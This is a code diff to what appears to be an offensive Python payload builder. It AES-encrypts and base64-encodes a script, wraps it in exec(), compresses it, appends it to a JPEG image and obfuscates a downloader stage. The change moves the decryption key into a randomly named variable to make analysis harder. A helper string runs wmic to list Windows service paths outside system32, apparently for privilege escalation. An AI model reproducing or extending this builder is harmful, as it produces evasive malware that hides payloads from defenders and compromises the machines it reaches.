@@ -111,7 +111,7 @@ pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
 key, key2, iv, secretkey = randKey(32), randKey(32), randKey(16), randKey(32)
-be64var, bd64var, AESvar, envvar, bz2var, urlvar = randVar(), randVar(), randVar(), randVar(), randVar(), randVar()
+be64var, bd64var, AESvar, envvar, bz2var, urlvar, keyvar = randVar(), randVar(), randVar(), randVar(), randVar(), randVar(), randVar()
 triplequote = "'" * 3
 lswinservices = triplequote + '''for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a''' + triplequote
 junkvar = randVar()
@@ -167,7 +167,7 @@ random.shuffle(mywindows)
 
 cipher = AES.new(key)
 payload = EncodeAES(cipher, readyscript)
-downpayload = "exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key,bd64var,payload)))
+downpayload = "exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(%s).decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,keyvar,bd64var,payload)))
 downpayload = base64.b64encode(bz2.compress(downpayload))
 with open('tools/cup.jpg', 'rb') as di:
 	downpayload = di.read() + downpayload
@@ -193,7 +193,7 @@ with open(dlf, 'rb') as dl:
 with open('tempobfs.py', 'wb') as o:
 	o.write(downloaderscript)
 obstime = subprocess.Popen('python tools/pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-downloaderscript = obstime.stdout.read()
+downloaderscript = keyvar + ' = "' + key + '"\n' + obstime.stdout.read()
 os.remove('tempobfs.py')
 cipher = AES.new(key2)
 downloader = EncodeAES(cipher, downloaderscript)
